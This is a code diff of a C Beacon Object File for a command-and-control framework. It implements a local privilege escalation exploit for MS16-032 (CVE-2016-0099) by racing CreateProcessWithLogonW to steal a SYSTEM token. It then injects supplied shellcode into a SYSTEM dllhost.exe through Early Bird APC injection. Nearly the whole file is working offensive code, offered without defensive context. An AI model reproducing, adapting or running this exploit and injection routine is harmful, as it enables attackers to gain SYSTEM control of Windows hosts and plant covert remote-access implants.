@@ -2,69 +2,40 @@
 #include "beacon.h"
 
 /* ------------------------------------------------------------------ */
-/*  NTSTATUS helpers                                                   */
+/*  MS16-032 Local Privilege Escalation BOF                            */
+/*  CVE-2016-0099 — Race condition in Secondary Logon Service          */
+/*                                                                     */
+/*  The seclogon service (running as SYSTEM) processes                  */
+/*  CreateProcessWithLogonW requests. When multiple threads race this   */
+/*  call, the service can confuse which client it's servicing and       */
+/*  assign its own SYSTEM token as the primary token of the child       */
+/*  process. We detect this by checking each spawned child's token.     */
 /* ------------------------------------------------------------------ */
 
 #ifndef NTSTATUS
 #define NTSTATUS LONG
 #endif
 
-#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
-#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
-#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)
-
-#define SystemExtendedHandleInformation 64
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
 #ifndef SECURITY_MANDATORY_SYSTEM_RID
 #define SECURITY_MANDATORY_SYSTEM_RID 0x00004000
 #endif
 
-#define DESIRED_TOKEN_ACCESS \
-    (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | \
-     TOKEN_ADJUST_PRIVILEGES | TOKEN_IMPERSONATE)
-
 #define NUM_RACE_THREADS       10
-#define MAX_EXPLOIT_ATTEMPTS   10
-#define RACE_DURATION_MS       1500
-#define THREAD_WAIT_TIMEOUT_MS 5000
+#define MAX_RACE_ITERATIONS    500
+#define MAX_EXPLOIT_ATTEMPTS   15
 
 /* ------------------------------------------------------------------ */
-/*  Native structures (architecture-safe EX variants)                  */
+/*  Shared race state                                                   */
 /* ------------------------------------------------------------------ */
 
-typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
-    PVOID     Object;
-    ULONG_PTR UniqueProcessId;
-    ULONG_PTR HandleValue;
-    ULONG     GrantedAccess;
-    USHORT    CreatorBackTraceIndex;
-    USHORT    ObjectTypeIndex;
-    ULONG     HandleAttributes;
-    ULONG     Reserved;
-} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
-
-typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
-    ULONG_PTR NumberOfHandles;
-    ULONG_PTR Reserved;
-    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
-} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
-
 typedef struct {
-    HANDLE hStopEvent;
-    LPWSTR lpCommandLine;
-} RACE_THREAD_DATA;
-
-typedef struct {
-    ULONG_PTR* values;
-    ULONG_PTR  count;
-} TOKEN_HANDLE_SNAPSHOT;
-
-typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
-    ULONG  SystemInformationClass,
-    PVOID  SystemInformation,
-    ULONG  SystemInformationLength,
-    PULONG ReturnLength
-);
+    volatile LONG   fFound;         /* 1 = SYSTEM token found          */
+    volatile LONG   fStop;          /* 1 = all threads should exit     */
+    HANDLE          hSystemToken;   /* duplicated SYSTEM token         */
+    CRITICAL_SECTION cs;            /* protects hSystemToken write     */
+} RACE_STATE;
 
 /* ------------------------------------------------------------------ */
 /*  Helpers                                                            */
@@ -83,160 +54,40 @@ static int wcsstr_check(const wchar_t* haystack, const wchar_t* needle) {
     return 0;
 }
 
-static PSYSTEM_HANDLE_INFORMATION_EX QuerySystemHandles(fnNtQuerySystemInformation NtQSI) {
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
-    ULONG  size  = 0x200000;
-    PSYSTEM_HANDLE_INFORMATION_EX pInfo = NULL;
-    NTSTATUS status;
-
-    do {
-        pInfo = (PSYSTEM_HANDLE_INFORMATION_EX)KERNEL32$HeapAlloc(hHeap, 0, size);
-        if (!pInfo) return NULL;
-
-        status = NtQSI(SystemExtendedHandleInformation, pInfo, size, NULL);
-
-        if (status == STATUS_INFO_LENGTH_MISMATCH ||
-            status == STATUS_BUFFER_TOO_SMALL) {
-            KERNEL32$HeapFree(hHeap, 0, pInfo);
-            pInfo = NULL;
-            size *= 2;
-        }
-    } while (status == STATUS_INFO_LENGTH_MISMATCH ||
-             status == STATUS_BUFFER_TOO_SMALL);
-
-    if (status != STATUS_SUCCESS) {
-        if (pInfo) KERNEL32$HeapFree(hHeap, 0, pInfo);
-        return NULL;
-    }
-    return pInfo;
-}
-
-/* ------------------------------------------------------------------ */
-/*  Dynamic token type index resolution                                */
-/*  Opens our own process token, finds it in the system handle table,  */
-/*  and reads back whatever ObjectTypeIndex the kernel assigned to      */
-/*  Token objects on this build.                                       */
-/* ------------------------------------------------------------------ */
-
-static USHORT ResolveTokenTypeIndex(fnNtQuerySystemInformation NtQSI) {
-    HANDLE  hToken   = NULL;
-    USHORT  typeIdx  = 0;
-    DWORD   pid;
-    ULONG_PTR i;
-    PSYSTEM_HANDLE_INFORMATION_EX pInfo;
-
-    if (!ADVAPI32$OpenProcessToken(
-            KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
-        return 0;
-
-    pid   = KERNEL32$GetCurrentProcessId();
-    pInfo = QuerySystemHandles(NtQSI);
-
-    if (!pInfo) {
-        KERNEL32$CloseHandle(hToken);
-        return 0;
-    }
-
-    for (i = 0; i < pInfo->NumberOfHandles; i++) {
-        if (pInfo->Handles[i].UniqueProcessId == (ULONG_PTR)pid &&
-            pInfo->Handles[i].HandleValue     == (ULONG_PTR)hToken) {
-            typeIdx = pInfo->Handles[i].ObjectTypeIndex;
-            break;
-        }
-    }
-
-    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pInfo);
-    KERNEL32$CloseHandle(hToken);
-    return typeIdx;
-}
-
-/* ------------------------------------------------------------------ */
-/*  Handle snapshots — baseline / diff approach                        */
-/* ------------------------------------------------------------------ */
-
-static TOKEN_HANDLE_SNAPSHOT SnapshotTokenHandles(
-    fnNtQuerySystemInformation NtQSI,
-    DWORD  pid,
-    USHORT tokenTypeIdx)
-{
-    TOKEN_HANDLE_SNAPSHOT snap;
-    HANDLE    hHeap = KERNEL32$GetProcessHeap();
-    ULONG_PTR i, count, idx;
-    PSYSTEM_HANDLE_INFORMATION_EX pInfo;
-
-    snap.values = NULL;
-    snap.count  = 0;
-
-    pInfo = QuerySystemHandles(NtQSI);
-    if (!pInfo) return snap;
-
-    count = 0;
-    for (i = 0; i < pInfo->NumberOfHandles; i++) {
-        if (pInfo->Handles[i].UniqueProcessId == (ULONG_PTR)pid &&
-            pInfo->Handles[i].ObjectTypeIndex  == tokenTypeIdx)
-            count++;
-    }
-
-    snap.values = (ULONG_PTR*)KERNEL32$HeapAlloc(
-        hHeap, 0, (count + 1) * sizeof(ULONG_PTR));
-
-    if (!snap.values) {
-        KERNEL32$HeapFree(hHeap, 0, pInfo);
-        return snap;
-    }
-
-    idx = 0;
-    for (i = 0; i < pInfo->NumberOfHandles; i++) {
-        if (pInfo->Handles[i].UniqueProcessId == (ULONG_PTR)pid &&
-            pInfo->Handles[i].ObjectTypeIndex  == tokenTypeIdx) {
-            snap.values[idx++] = pInfo->Handles[i].HandleValue;
-        }
-    }
-    snap.count = count;
-
-    KERNEL32$HeapFree(hHeap, 0, pInfo);
-    return snap;
-}
-
-static BOOL IsHandleInSnapshot(ULONG_PTR hv, TOKEN_HANDLE_SNAPSHOT* snap) {
-    ULONG_PTR i;
-    for (i = 0; i < snap->count; i++) {
-        if (snap->values[i] == hv) return TRUE;
-    }
-    return FALSE;
-}
-
 /* ------------------------------------------------------------------ */
 /*  Token validation                                                   */
-/*  Checks: primary type, SYSTEM SID, system-level integrity.          */
+/*  Checks: primary type, SYSTEM SID (S-1-5-18), system integrity.     */
 /* ------------------------------------------------------------------ */
 
 static BOOL ValidateSystemToken(HANDLE hToken) {
     DWORD      retLen;
-    BYTE       buf[512];
+    BYTE       userBuf[256];
+    BYTE       ilBuf[256];
     TOKEN_TYPE tt;
     LPWSTR     sidStr = NULL;
     BOOL       isSys;
-    BYTE       ilBuf[256];
 
+    /* Must be a primary token */
     if (!ADVAPI32$GetTokenInformation(
             hToken, TokenType, &tt, sizeof(tt), &retLen))
         return FALSE;
     if (tt != TokenPrimary)
         return FALSE;
 
+    /* Token user must be SYSTEM (S-1-5-18) */
     if (!ADVAPI32$GetTokenInformation(
-            hToken, TokenUser, buf, sizeof(buf), &retLen))
+            hToken, TokenUser, userBuf, sizeof(userBuf), &retLen))
         return FALSE;
 
     if (!ADVAPI32$ConvertSidToStringSidW(
-            ((TOKEN_USER*)buf)->User.Sid, &sidStr))
+            ((TOKEN_USER*)userBuf)->User.Sid, &sidStr))
         return FALSE;
 
     isSys = wcsstr_check(sidStr, L"S-1-5-18");
     KERNEL32$LocalFree(sidStr);
     if (!isSys) return FALSE;
 
+    /* Integrity level must be System (optional — some tokens lack this) */
     if (ADVAPI32$GetTokenInformation(
             hToken, TokenIntegrityLevel, ilBuf, sizeof(ilBuf), &retLen)) {
         TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL*)ilBuf;
@@ -253,10 +104,94 @@ static BOOL ValidateSystemToken(HANDLE hToken) {
 }
 
 /* ------------------------------------------------------------------ */
+/*  Race thread                                                        */
+/*                                                                     */
+/*  Each thread repeatedly calls CreateProcessWithLogonW with          */
+/*  CREATE_SUSPENDED, opens the child's token, and checks if the race  */
+/*  caused seclogon to assign its SYSTEM token to the child.           */
+/* ------------------------------------------------------------------ */
+
+static DWORD WINAPI RaceThread(LPVOID lpParam) {
+    RACE_STATE*          pState = (RACE_STATE*)lpParam;
+    STARTUPINFOW         si;
+    PROCESS_INFORMATION  pi;
+    HANDLE               hChildToken;
+    HANDLE               hDupToken;
+    int                  iter;
+
+    MSVCRT$memset(&si, 0, sizeof(si));
+    si.cb         = sizeof(si);
+    si.dwFlags    = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    for (iter = 0; iter < MAX_RACE_ITERATIONS; iter++) {
+
+        /* Check if another thread already won or we were told to stop */
+        if (KERNEL32$InterlockedCompareExchange(&pState->fFound, 0, 0) ||
+            KERNEL32$InterlockedCompareExchange(&pState->fStop, 0, 0))
+            break;
+
+        MSVCRT$memset(&pi, 0, sizeof(pi));
+
+        /* The race target: CreateProcessWithLogonW
+         * With LOGON_NETCREDENTIALS_ONLY, seclogon doesn't validate creds
+         * but still processes the token assignment path that has the race.
+         * CREATE_SUSPENDED keeps the child alive so we can inspect it. */
+        if (!ADVAPI32$CreateProcessWithLogonW(
+                L"foo", L"bar", L"baz",
+                LOGON_NETCREDENTIALS_ONLY,
+                NULL,
+                L"C:\\Windows\\System32\\cmd.exe",
+                CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                NULL, NULL, &si, &pi)) {
+            continue;
+        }
+
+        /* Open the child process's primary token */
+        hChildToken = NULL;
+        if (ADVAPI32$OpenProcessToken(
+                pi.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hChildToken)) {
+
+            /* Check if the child got SYSTEM's token */
+            if (ValidateSystemToken(hChildToken)) {
+
+                /* Duplicate for later use (full access) */
+                hDupToken = NULL;
+                if (KERNEL32$DuplicateHandle(
+                        KERNEL32$GetCurrentProcess(), hChildToken,
+                        KERNEL32$GetCurrentProcess(), &hDupToken,
+                        TOKEN_ALL_ACCESS, FALSE, 0)) {
+
+                    KERNEL32$EnterCriticalSection(&pState->cs);
+                    if (!pState->hSystemToken) {
+                        pState->hSystemToken = hDupToken;
+                        KERNEL32$InterlockedExchange(&pState->fFound, 1);
+                    } else {
+                        KERNEL32$CloseHandle(hDupToken);
+                    }
+                    KERNEL32$LeaveCriticalSection(&pState->cs);
+                }
+            }
+            KERNEL32$CloseHandle(hChildToken);
+        }
+
+        /* Kill the child — we either got its token or it's not useful */
+        KERNEL32$TerminateProcess(pi.hProcess, 0);
+        KERNEL32$CloseHandle(pi.hProcess);
+        KERNEL32$CloseHandle(pi.hThread);
+
+        /* Short yield to let other threads compete in the race */
+        KERNEL32$Sleep(0);
+    }
+
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
 /*  Privilege helper                                                   */
 /* ------------------------------------------------------------------ */
 
-static BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR privName) {
+static BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privName) {
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
@@ -272,85 +207,8 @@ static BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR privName) {
 }
 
 /* ------------------------------------------------------------------ */
-/*  Race thread — spams CreateProcessWithLogonW until stop event       */
-/* ------------------------------------------------------------------ */
-
-static DWORD WINAPI RaceThread(LPVOID lpParam) {
-    RACE_THREAD_DATA*    pData = (RACE_THREAD_DATA*)lpParam;
-    STARTUPINFOW         si;
-    PROCESS_INFORMATION  pi;
-
-    MSVCRT$memset(&si, 0, sizeof(si));
-    si.cb = sizeof(si);
-
-    while (KERNEL32$WaitForSingleObject(pData->hStopEvent, 0)
-           != WAIT_OBJECT_0) {
-
-        MSVCRT$memset(&pi, 0, sizeof(pi));
-
-        ADVAPI32$CreateProcessWithLogonW(
-            L"x", L"x", L"x",
-            LOGON_NETCREDENTIALS_ONLY,
-            NULL,
-            pData->lpCommandLine,
-            CREATE_SUSPENDED | CREATE_NO_WINDOW,
-            NULL, NULL, &si, &pi);
-
-        if (pi.hProcess) {
-            KERNEL32$TerminateProcess(pi.hProcess, 0);
-            KERNEL32$CloseHandle(pi.hProcess);
-            KERNEL32$CloseHandle(pi.hThread);
-        }
-    }
-
-    return 0;
-}
-
-/* ------------------------------------------------------------------ */
-/*  Diff before/after snapshots to find leaked SYSTEM tokens           */
-/* ------------------------------------------------------------------ */
-
-static HANDLE FindLeakedToken(
-    fnNtQuerySystemInformation NtQSI,
-    DWORD                      pid,
-    USHORT                     tokenTypeIdx,
-    TOKEN_HANDLE_SNAPSHOT*     baseline)
-{
-    HANDLE    hResult = NULL;
-    ULONG_PTR i;
-    TOKEN_HANDLE_SNAPSHOT after;
-
-    after = SnapshotTokenHandles(NtQSI, pid, tokenTypeIdx);
-    if (!after.values) return NULL;
-
-    for (i = 0; i < after.count && !hResult; i++) {
-        HANDLE hCandidate, hDup;
-
-        if (IsHandleInSnapshot(after.values[i], baseline))
-            continue;
-
-        hCandidate = (HANDLE)after.values[i];
-        hDup       = NULL;
-
-        if (KERNEL32$DuplicateHandle(
-                KERNEL32$GetCurrentProcess(), hCandidate,
-                KERNEL32$GetCurrentProcess(), &hDup,
-                DESIRED_TOKEN_ACCESS, FALSE, 0)) {
-
-            if (ValidateSystemToken(hDup))
-                hResult = hDup;
-            else
-                KERNEL32$CloseHandle(hDup);
-        }
-    }
-
-    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, after.values);
-    return hResult;
-}
-
-/* ------------------------------------------------------------------ */
-/*  Beacon injection — Early Bird APC into a sacrificial process       */
-/*  Uses RW->RX memory and QueueUserAPC (no CreateRemoteThread).      */
+/*  Beacon injection — Early Bird APC into sacrificial SYSTEM process   */
+/*  RW->RX memory protection, QueueUserAPC (no CreateRemoteThread).    */
 /* ------------------------------------------------------------------ */
 
 static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
@@ -359,7 +217,7 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
     LPVOID   pRemote;
     SIZE_T   written;
     DWORD    oldProt;
-    BOOL     created;
+    BOOL     created = FALSE;
     BOOL     impersonating = FALSE;
     wchar_t  target[] = L"C:\\Windows\\System32\\dllhost.exe";
 
@@ -374,7 +232,11 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
         NULL, NULL, &si, &pi);
 
     if (!created) {
-        /* Method 2: impersonate SYSTEM, then CreateProcessAsUserW */
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[*] CreateProcessWithTokenW failed (%d), trying impersonation...",
+            KERNEL32$GetLastError());
+
+        /* Method 2: Impersonate, then CreateProcessAsUserW */
         if (ADVAPI32$ImpersonateLoggedOnUser(hSystemToken)) {
             impersonating = TRUE;
             created = ADVAPI32$CreateProcessAsUserW(
@@ -389,22 +251,22 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
 
     if (!created) {
         BeaconPrintf(CALLBACK_ERROR,
-            "Cannot spawn SYSTEM process (need SeImpersonatePrivilege): %d",
+            "[-] Cannot spawn SYSTEM process: %d",
             KERNEL32$GetLastError());
         return FALSE;
     }
 
     BeaconPrintf(CALLBACK_OUTPUT,
-        "[+] Sacrificial process PID %d", pi.dwProcessId);
+        "[+] Spawned sacrificial SYSTEM process PID: %d", pi.dwProcessId);
 
-    /* Allocate RW */
+    /* Allocate RW memory in target */
     pRemote = KERNEL32$VirtualAllocEx(
         pi.hProcess, NULL, scLen,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!pRemote) {
         BeaconPrintf(CALLBACK_ERROR,
-            "VirtualAllocEx failed: %d", KERNEL32$GetLastError());
+            "[-] VirtualAllocEx failed: %d", KERNEL32$GetLastError());
         goto fail;
     }
 
@@ -412,33 +274,34 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
     if (!KERNEL32$WriteProcessMemory(
             pi.hProcess, pRemote, sc, scLen, &written)) {
         BeaconPrintf(CALLBACK_ERROR,
-            "WriteProcessMemory failed: %d", KERNEL32$GetLastError());
+            "[-] WriteProcessMemory failed: %d", KERNEL32$GetLastError());
         KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
         goto fail;
     }
 
-    /* Flip RW -> RX */
+    /* Flip RW -> RX (no RWX) */
     if (!KERNEL32$VirtualProtectEx(
             pi.hProcess, pRemote, scLen,
             PAGE_EXECUTE_READ, &oldProt)) {
         BeaconPrintf(CALLBACK_ERROR,
-            "VirtualProtectEx failed: %d", KERNEL32$GetLastError());
+            "[-] VirtualProtectEx failed: %d", KERNEL32$GetLastError());
         KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
         goto fail;
     }
 
-    /* Queue APC — fires during NtTestAlert before the entry point */
+    /* Queue APC on suspended main thread — fires before entry point */
     if (!KERNEL32$QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0)) {
         BeaconPrintf(CALLBACK_ERROR,
-            "QueueUserAPC failed: %d", KERNEL32$GetLastError());
+            "[-] QueueUserAPC failed: %d", KERNEL32$GetLastError());
         KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
         goto fail;
     }
 
-    /* Resume — APC executes, beacon starts */
+    /* Resume — APC executes our shellcode */
     KERNEL32$ResumeThread(pi.hThread);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Beacon injected via APC");
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[+] Beacon injected via Early Bird APC — should check in shortly");
     KERNEL32$CloseHandle(pi.hProcess);
     KERNEL32$CloseHandle(pi.hThread);
     return TRUE;
@@ -459,156 +322,118 @@ void go(char* args, int len) {
     int                  scLen = 0;
     unsigned char*       sc;
     SYSTEM_INFO          sysInfo;
-    USHORT               tokenTypeIdx;
-    DWORD                pid;
-    HANDLE               hStopEvent;
-    HANDLE               hSystemToken = NULL;
-    HANDLE               hHeap;
-    HANDLE               hThreads[NUM_RACE_THREADS];
     HANDLE               hProcToken = NULL;
-    HMODULE              hNtdll;
-    fnNtQuerySystemInformation NtQSI;
-    RACE_THREAD_DATA     tData;
-    TOKEN_HANDLE_SNAPSHOT baseline;
+    HANDLE               hThreads[NUM_RACE_THREADS];
+    RACE_STATE           state;
     int                  attempt, i, numThreads;
 
-    /* ---- Parse shellcode ---- */
+    /* ---- Parse shellcode from Aggressor ---- */
     BeaconDataParse(&parser, args, len);
     sc = (unsigned char*)BeaconDataExtract(&parser, &scLen);
 
     if (!sc || scLen == 0) {
         BeaconPrintf(CALLBACK_ERROR,
-            "No shellcode. Usage: ms16032_inject <listener>");
+            "[-] No shellcode provided. Usage: ms16032_inject <listener>");
         return;
     }
 
-    /* ---- Pre-flight: CPU count ---- */
+    /* ---- Pre-flight: CPU count (race requires 2+ cores) ---- */
     KERNEL32$GetSystemInfo(&sysInfo);
     if (sysInfo.dwNumberOfProcessors < 2) {
         BeaconPrintf(CALLBACK_ERROR,
-            "Exploit requires 2+ logical CPUs (found %d)",
+            "[-] MS16-032 requires 2+ logical CPUs (found %d)",
             sysInfo.dwNumberOfProcessors);
         return;
     }
 
     BeaconPrintf(CALLBACK_OUTPUT,
-        "[*] MS16-032 LPE | CPUs: %d | Shellcode: %d bytes",
+        "[*] MS16-032 Local Privilege Escalation");
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[*] CPUs: %d | Shellcode: %d bytes",
         sysInfo.dwNumberOfProcessors, scLen);
 
-    /* ---- Resolve ntdll functions ---- */
-    hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
-    NtQSI  = (fnNtQuerySystemInformation)KERNEL32$GetProcAddress(
-                 hNtdll, "NtQuerySystemInformation");
-
-    if (!NtQSI) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "Cannot resolve NtQuerySystemInformation");
-        return;
-    }
-
-    /* ---- Resolve token type index dynamically ---- */
-    tokenTypeIdx = ResolveTokenTypeIndex(NtQSI);
-    if (tokenTypeIdx == 0) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "Cannot resolve token object type index");
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT,
-        "[*] Token type index: %d", tokenTypeIdx);
-
-    pid   = KERNEL32$GetCurrentProcessId();
-    hHeap = KERNEL32$GetProcessHeap();
-
-    /* ---- Create stop event for clean thread shutdown ---- */
-    hStopEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
-    if (!hStopEvent) {
-        BeaconPrintf(CALLBACK_ERROR, "CreateEvent failed");
-        return;
-    }
-
-    tData.hStopEvent     = hStopEvent;
-    tData.lpCommandLine  = L"C:\\Windows\\System32\\cmd.exe";
-
-    /* ---- Exploitation loop ---- */
-    for (attempt = 0; attempt < MAX_EXPLOIT_ATTEMPTS && !hSystemToken;
-         attempt++) {
-
-        BeaconPrintf(CALLBACK_OUTPUT,
-            "[*] Attempt %d/%d", attempt + 1, MAX_EXPLOIT_ATTEMPTS);
-
-        /* Baseline snapshot of token handles in our process */
-        baseline = SnapshotTokenHandles(NtQSI, pid, tokenTypeIdx);
-        if (!baseline.values) {
-            BeaconPrintf(CALLBACK_ERROR, "Handle snapshot failed");
-            continue;
-        }
-
-        BeaconPrintf(CALLBACK_OUTPUT,
-            "[*] Baseline: %llu token handles — racing...",
-            (unsigned long long)baseline.count);
-
-        /* Start race threads */
-        KERNEL32$ResetEvent(hStopEvent);
-        numThreads = 0;
-        for (i = 0; i < NUM_RACE_THREADS; i++) {
-            HANDLE h = KERNEL32$CreateThread(
-                NULL, 0, RaceThread, &tData, 0, NULL);
-            if (h) hThreads[numThreads++] = h;
-        }
-
-        if (numThreads == 0) {
-            BeaconPrintf(CALLBACK_ERROR, "Failed to create race threads");
-            KERNEL32$HeapFree(hHeap, 0, baseline.values);
-            continue;
-        }
-
-        /* Let the race run */
-        KERNEL32$Sleep(RACE_DURATION_MS);
-
-        /* Clean shutdown */
-        KERNEL32$SetEvent(hStopEvent);
-        KERNEL32$WaitForMultipleObjects(
-            numThreads, hThreads, TRUE, THREAD_WAIT_TIMEOUT_MS);
-
-        for (i = 0; i < numThreads; i++)
-            KERNEL32$CloseHandle(hThreads[i]);
-
-        /* Diff snapshots — any new SYSTEM token handle? */
-        hSystemToken = FindLeakedToken(
-            NtQSI, pid, tokenTypeIdx, &baseline);
-
-        KERNEL32$HeapFree(hHeap, 0, baseline.values);
-
-        if (hSystemToken)
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM token acquired!");
-    }
-
-    KERNEL32$CloseHandle(hStopEvent);
-
-    if (!hSystemToken) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "No SYSTEM token after %d attempts — target may be patched",
-            MAX_EXPLOIT_ATTEMPTS);
-        return;
-    }
-
-    /* ---- Best-effort: enable SeImpersonatePrivilege on own token ---- */
+    /* ---- Best-effort: enable SeImpersonatePrivilege ---- */
     if (ADVAPI32$OpenProcessToken(
             KERNEL32$GetCurrentProcess(),
             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
             &hProcToken)) {
-        EnableTokenPrivilege(hProcToken, L"SeImpersonatePrivilege");
+        EnablePrivilege(hProcToken, L"SeImpersonatePrivilege");
+        EnablePrivilege(hProcToken, L"SeAssignPrimaryTokenPrivilege");
         KERNEL32$CloseHandle(hProcToken);
     }
 
-    /* ---- Inject beacon ---- */
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Injecting beacon...");
+    /* ---- Initialize race state ---- */
+    MSVCRT$memset(&state, 0, sizeof(state));
+    KERNEL32$InitializeCriticalSection(&state.cs);
 
-    if (InjectBeacon(hSystemToken, sc, scLen))
+    /* ---- Exploitation loop ---- */
+    for (attempt = 0; attempt < MAX_EXPLOIT_ATTEMPTS; attempt++) {
+
+        if (state.hSystemToken) break;
+
         BeaconPrintf(CALLBACK_OUTPUT,
-            "[+] Exploit complete — beacon should check in shortly");
-    else
-        BeaconPrintf(CALLBACK_ERROR, "Injection failed");
+            "[*] Attempt %d/%d — racing seclogon...",
+            attempt + 1, MAX_EXPLOIT_ATTEMPTS);
 
-    KERNEL32$CloseHandle(hSystemToken);
+        /* Reset state for this attempt */
+        KERNEL32$InterlockedExchange(&state.fFound, 0);
+        KERNEL32$InterlockedExchange(&state.fStop, 0);
+
+        /* Launch race threads */
+        numThreads = 0;
+        for (i = 0; i < NUM_RACE_THREADS; i++) {
+            HANDLE h = KERNEL32$CreateThread(
+                NULL, 0, RaceThread, &state, 0, NULL);
+            if (h) hThreads[numThreads++] = h;
+        }
+
+        if (numThreads == 0) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[-] Failed to create race threads");
+            break;
+        }
+
+        /* Wait for all threads to finish (they self-limit iterations) */
+        KERNEL32$WaitForMultipleObjects(
+            numThreads, hThreads, TRUE, 60000);
+
+        /* Signal stop in case any thread is still going */
+        KERNEL32$InterlockedExchange(&state.fStop, 1);
+
+        /* Brief wait for stragglers then close handles */
+        KERNEL32$WaitForMultipleObjects(
+            numThreads, hThreads, TRUE, 5000);
+
+        for (i = 0; i < numThreads; i++)
+            KERNEL32$CloseHandle(hThreads[i]);
+
+        if (state.hSystemToken) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[+] SYSTEM token acquired!");
+            break;
+        }
+    }
+
+    KERNEL32$DeleteCriticalSection(&state.cs);
+
+    if (!state.hSystemToken) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] Failed to obtain SYSTEM token after %d attempts",
+            MAX_EXPLOIT_ATTEMPTS);
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] Target may be patched (MS16-032 / KB3139914)");
+        return;
+    }
+
+    /* ---- Inject beacon as SYSTEM ---- */
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Injecting beacon as SYSTEM...");
+
+    if (InjectBeacon(state.hSystemToken, sc, scLen))
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[+] Exploit complete!");
+    else
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] Injection failed");
+
+    KERNEL32$CloseHandle(state.hSystemToken);
 }
